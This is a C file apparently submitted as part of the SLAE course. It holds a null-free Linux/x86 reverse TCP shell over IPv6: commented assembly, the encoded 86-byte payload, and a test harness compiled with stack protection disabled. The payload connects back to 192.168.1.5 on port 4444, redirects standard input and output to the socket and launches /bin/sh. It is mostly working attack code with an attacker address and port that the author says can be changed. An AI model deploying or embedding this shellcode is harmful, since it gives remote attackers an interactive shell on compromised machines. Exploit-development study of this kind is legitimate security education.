/*
# Title: Linux/x86 - Reverse TCP shell (IPv6) + Null Free
# Shellcode Author: Kartik Durg
# Shellcode Length: 86 BYTES
# Student-ID: SLAE-1233
# Note ~
https://iamroot.blog/2018/07/29/0x2-shell_reverse_tcp_ipv6-linux-x86/
# Description: Connect-back to IPV6 socket listening on IP
::FFFF:192.168.1.5 and port 4444.
*/

/*

global _start
section .text

;References:
;(1)http://syscalls.kernelgrok.com/
;(2)https://www.3dbrew.org/wiki/Socket_Services
;(3)
https://www.ibm.com/support/knowledgecenter/en/ssw_ibm_i_71/rzab6/cafinet6.htm

_start:
;IPV6 socket creation
;int socketcall(int call, unsigned long *args);
;sockfd = socket(int socket_family, int socket_type, int protocol);
push byte 0x66        ;socketcall()
pop eax                    ;EAX=0x2

xor ebx,ebx              ;zero out ebx

push 0x6                  ; IPPROTO_TCP=6
push 0x1                  ; socket_type=SOCK_STREAM (0x1)
push 0xa                  ; AF_INET6
inc ebx                     ; Define SYS_socket = 1
mov ecx,esp            ; save pointer (ESP) to socket() args (ECX)
int 0x80
xchg esi,eax            ; sockfd stored in esi
xor eax,eax

;Connect
;connect(sockfd, (struct sockaddr*)&srvaddr, sizeof(srvaddr));
;int socketcall(int call, unsigned long *args);
push DWORD eax                 ;sin6_scope_id
push DWORD 0x0501a8c0   ;MY LOCAL IP = 192.168.1.5 | Can be configured to
YOUR's
push word 0xffff
push DWORD eax
push DWORD eax
push WORD ax        ;inet_pton(AF_INET6, "::ffff:192.168.1.5",
&srvaddr.sin6_addr)
push DWORD eax                  ;sin6_flowinfo
push WORD 0x5c11               ;sin6_port=4444 | 0x5c11 | Configurable |
push WORD 0x0a                   ;AF_INET6
mov ecx,esp                            ;ECX holds pointer to struct
sockaddr_in6
push byte 0x1c                        ;sizeof(sockaddr_in6) | sockaddr_in6
= 28
push ecx                                  ;pointer to sockfd
push esi                                   ;sockfd
mov ecx,esp                            ;ECX points to args
inc ebx
inc ebx                                      ;EBX = 0x3 | #define
SYS_Connect 3
push byte 0x66                         ;socketcall()
pop eax
int 80h

push byte 0x2                           ;push 0x2 on stack
pop ecx                                     ;ECX = 2

;dup2() to redirect stdin(0), stdout(1) and stderr(2)
loop:
push byte 0x3f        ;dup2()
pop eax                   ;EAX = 0x3f
int 0x80                   ;exec sys_dup2
dec ecx                    ;decrement counter
jns loop                    ;if SF not set ==> keep on jumping

;execve(/bin//sh)
xor ecx,ecx               ;clear ECX
push ecx                   ;Push NULL
push byte 0x0b         ;execve() sys call number
pop eax                     ;EAX=0x2 | execve()
push 0x68732f2f       ;(1)/bin//sh
push 0x6e69622f      ;(2)/bin//sh
mov ebx,esp             ;EBX pointing to “/bin//sh”
int 0x80                     ;Calling Interrupt for sys call

*/

/*
gcc shellcode.c -o shellcode -fno-stack-protector -z execstack -m32

./shellcode

*/

#include<stdio.h>

unsigned char shellcode[] = \
"\x6a\x66\x58\x31\xdb\x6a\x06\x6a\x01\x6a\x0a\x43\x89\xe1\xcd\x80\x96\x31\xc0\x50\x68\xc0\xa8\x01\x05\x66\x6a\xff\x50\x50\x66\x50\x50\x66\x68\x11\x5c\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
int (*ret)() = (int(*)())shellcode;
ret();
}